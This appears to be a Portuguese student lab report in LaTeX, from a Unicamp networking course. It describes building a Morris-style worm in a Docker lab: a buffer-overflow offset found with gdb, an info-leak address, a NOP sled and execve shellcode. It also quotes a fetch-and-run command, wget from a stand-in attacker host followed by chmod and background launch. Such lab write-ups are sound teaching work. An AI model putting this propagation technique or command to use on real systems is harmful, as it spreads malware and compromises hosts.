@@ -1,0 +1,79 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage{logo-ic-unicamp}
+\usepackage{logo-unicamp}
+\usepackage{graphicx}
+\usepackage{float}
+
+\usepackage{geometry}
+\geometry{
+  left=2.5cm,
+  right=2.5cm,
+  top=2.5cm,
+  bottom=2.5cm
+}
+\begin{document}
+
+% --- START OF UNIQUE HEADER ---
+\thispagestyle{empty} % Removes page number from first page 
+\noindent
+{
+\fontfamily{phv}\selectfont % Switch to Helvetica (Arial)
+\fontsize{11pt}{13.2pt}\selectfont % Set size to 11pt with standard leading
+\begin{minipage}[c]{0.15\textwidth}
+    \centering
+    \LogoUnicamp % Command from logo-unicamp.sty
+\end{minipage}
+\hfill
+\begin{minipage}[c]{0.65\textwidth}
+    \centering
+    \textbf{Relatório de desenvolvimento das atividades}\\[0.2cm]
+    \textit{Instituto de Computação - Universidade Estadual de Campinas\\Allan M. de Souza, Rafael O. Jarczewski}
+\end{minipage}
+\hfill
+\begin{minipage}[c]{0.15\textwidth}
+    \centering
+    \LogoIcUnicamp % Command from logo-ic-unicamp.sty
+\end{minipage}
+
+\vspace{1cm}
+}
+% --- END OF UNIQUE HEADER ---
+
+\noindent\textbf{Nome:} Yvens Ian Prado Porto\\
+\textbf{RA:} 184031
+
+\section{Introdução}
+O presente relatório descreve o desenvolvimento e a execução prática do Trabalho 05 da disciplina MC833, que consistiu na modelagem e implementação de um código autorreplicante (\textit{Worm}), inspirado no clássico Worm de Morris. O laboratório foi realizado em um ambiente de rede conteinerizado via Docker, composto por alvos vulneráveis a ataques de transbordamento de buffer (\textit{Buffer Overflow}) baseados na arquitetura x86\_64. O objetivo principal foi criar um script autônomo capaz de realizar reconhecimento de rede, contornar mecanismos de randomização de endereços extraindo vazamentos de memória (\textit{Info Leak}), construir \textit{payloads} dinâmicos e propagar-se de forma independente entre os nós da rede (sub-redes 172.28.1.0/24 a 172.28.5.0/24).
+
+\section{Diagnóstico e Engenharia do Ataque}
+Para que a exploração de \textit{Buffer Overflow} tivesse sucesso e permitisse a injeção do código malicioso, foi fundamental mapear precisamente o layout da pilha (\textit{Stack}) do servidor vulnerável. Inicialmente, ataques de força bruta com \textit{offsets} genéricos resultavam em interrupções silenciosas do processo.
+
+Utilizando a ferramenta GNU Debugger (\texttt{gdb}) em um dos contêineres alvo (\texttt{vitima\_01}), simulamos um \textit{crash} enviando um padrão rastreável de caracteres. Pela análise dos registradores no momento da falha (\textit{Segmentation Fault}), especificamente o \textit{Base Pointer} (\texttt{RBP}) e o \textit{Instruction Pointer} (\texttt{RIP}), determinamos empiricamente que o distanciamento (\textit{offset}) exato desde o início do \textit{buffer} até o endereço de retorno armazenado na pilha era de 72 bytes. Essa precisão metodológica garantiu que o endereço de retorno pudesse ser sobrescrito cirurgicamente.
+
+\section{Execução e Propagação Autônoma}
+O \textit{Worm} foi desenvolvido em Python e estruturado para operar em um ciclo contínuo de varredura (\texttt{while True}), orquestrando as fases de prospecção, exploração e replicação sem intervenção humana.
+
+\subsection{Reconhecimento e Captura do Info Leak}
+A função lógica \texttt{getNextTarget} foi implementada para iterar aleatoriamente sobre o espaço restrito de IPs ativos (hosts 10 a 14, alocados nas sub-redes 1 a 5). Ao selecionar um alvo, o script abre uma sessão TCP via \texttt{nc} na porta 9090. Explorando a falha de \textit{Info Leak} do servidor, o processo remoto vaza o endereço real de alocação do \textit{buffer} (e.g., \texttt{0x7fffffffe970}). O \textit{Worm} captura e faz o \textit{parsing} dessa string em tempo de execução, viabilizando o cálculo dinâmico da memória.
+
+\subsection{Construção Dinâmica do Payload (NOP Sled e Shellcode)}
+O pacote malicioso (\texttt{badfile}) foi forjado com um comprimento fixo de 500 bytes. Para maximizar a confiabilidade do ataque frente a ínfimas variações ambientais da pilha, empregou-se a técnica de \textit{NOP Sled}. Preenchemos o arquivo majoritariamente com instruções \textit{No-Operation} (\texttt{0x90}).
+
+O endereço de retorno sobrescrito (\texttt{ret}) não apontou para o início exato do pacote, mas foi calculado somando-se \texttt{0x100} ao endereço base capturado. Com o \textit{offset} de 72 bytes inserindo este valor no RIP da máquina alvo, a finalização da função vulnerável causava um salto para a região central do nosso \textit{NOP Sled}, deslizando o fluxo de instrução de forma segura e determinística até o \textit{shellcode} alocado ao final do arquivo.
+
+\subsection{Injeção e Replicação}
+O \textit{shellcode} injetado no final da sequência aciona uma \textit{syscall execve} executando o \texttt{/bin/sh}. A carga entregou comandos não interativos com três propósitos:
+\begin{itemize}
+    \item Gravar a \textit{flag} de verificação de infecção (\texttt{echo 'true' > infectado.txt}).
+    \item Realizar o download silencioso do próprio script malicioso, servido via \texttt{http.server} instanciado pelo nó atacante (\texttt{wget http://[IP\_ATACANTE]:8080/worm.py}).
+    \item Conceder privilégios de execução (\texttt{chmod +x}) e disparar a nova instância viral em \textit{background} (\texttt{\&}).
+\end{itemize}
+
+\section{Validação e Conclusão}
+A eficácia do \textit{Worm} foi confirmada monitorando-se remotamente o estado interno das vítimas (ex: via \texttt{docker exec vitima\_14}). O arquivo \texttt{infectado.txt} validou o valor \texttt{true}, ratificando o desvio no fluxo de execução imposto pelo transbordamento. O experimento consolida empiricamente as ameaças representadas por falhas de gerenciamento de memória em linguagens de baixo nível e ilustra a viabilidade matemática e arquitetural da propagação automatizada de \textit{malwares}.
+
+\section{Declaração de Uso de Inteligência Artificial}
+Declaro o uso de ferramentas de Inteligência Artificial Generativa como assistentes educacionais para o desenvolvimento desta atividade laboratorial. O auxílio concentrou-se no processo de \textit{troubleshooting} para refinamento empírico de distanciamento de memória (\textit{offset}) utilizando o GNU Debugger, na modularização das rotinas de captura de \textit{stdout} (\textit{Info Leak}) via biblioteca \texttt{subprocess} do Python e na revisão estrutural/tipográfica deste relatório em \LaTeX. A engenharia dos \textit{payloads}, o mapeamento da rede e as validações diretas no ambiente conteinerizado foram processadas de modo autoral.
+
+\end{document}
